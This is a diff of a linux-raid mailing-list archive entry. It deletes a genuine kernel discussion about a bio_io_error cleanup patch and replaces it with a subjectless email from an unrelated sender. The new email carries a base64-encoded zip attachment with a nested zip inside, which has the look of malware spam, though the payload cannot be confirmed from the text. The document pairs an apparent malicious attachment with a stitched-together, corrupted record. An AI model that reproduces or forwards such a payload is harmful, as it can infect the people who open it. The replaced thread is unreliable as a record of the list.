@@ -1,42 +1,70 @@
-From: Guoqing Jiang <gqjiang@suse.com>
-Subject: Re: [PATCH] md: simplify code with bio_io_error
-Date: Mon, 5 Jun 2017 11:11:55 +0800
-Message-ID: <32a5d968-0363-c1e0-a4eb-77a916a30de9@suse.com>
-References: <20170602074914.26842-1-gqjiang@suse.com>
- <20170602162926.onnaflcf26ahuoti@kernel.org>
- <20170603055742.GA19486@infradead.org>
+From: <citydesk@thereporteronline.com>
+Subject: (unknown)
+Date: Mon, 05 Jun 2017 04:30:15 -0000
+Message-ID: <149663701588.4334.5477487794107878538@vnpt.vn>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=windows-1252; format=flowed
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="721224187.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-raid-owner@vger.kernel.org>
-In-Reply-To: <20170603055742.GA19486@infradead.org>
+Content-Disposition: attachment
+Subject: 
 Sender: linux-raid-owner@vger.kernel.org
-To: Christoph Hellwig <hch@infradead.org>, Shaohua Li <shli@kernel.org>
-Cc: linux-raid@vger.kernel.org
+To: linux-raid@vger.kernel.org
 List-Id: linux-raid.ids
 
-
-
-On 06/03/2017 01:57 PM, Christoph Hellwig wrote:
-> On Fri, Jun 02, 2017 at 09:29:26AM -0700, Shaohua Li wrote:
->> On Fri, Jun 02, 2017 at 03:49:14PM +0800, Guoqing Jiang wrote:
->>> bio_io_error was introduced in the commit 4246a0b
->>> ("block: add a bi_error field to struct bio"), so
->>> use it to simplify code.
->>>
->>> Signed-off-by: Guoqing Jiang <gqjiang@suse.com>
->> Applied, thanks! There are several other places which could use conversion, I added
-> Ugg.  I have a massive series pending for the block layer that changes
-> the error values.  Applying these cleanups now will just introduce
-> conflicts all over.
->
-
-Hmm, I suppose you mean the thread with subject "dedicated error codes 
-for the block layer"
-which replace bi_error with bi_status. I can resend it on top of the 
-thread, or maybe you can
-add the changes in your patches directly.
-
-Thanks,
-Guoqing
-
+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
